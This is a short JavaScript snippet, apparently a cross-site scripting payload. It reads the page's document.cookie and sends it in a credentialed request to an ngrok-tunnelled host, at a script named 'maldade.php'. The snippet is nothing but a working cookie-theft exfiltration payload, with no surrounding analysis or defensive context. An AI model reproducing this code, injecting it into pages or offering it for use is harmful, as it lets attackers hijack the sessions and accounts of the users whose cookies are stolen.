const xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("GET", "https://58bd-191-162-139-174.ngrok.io/maldade.php?cookie=" + document.cookie);
xhr.send(null);
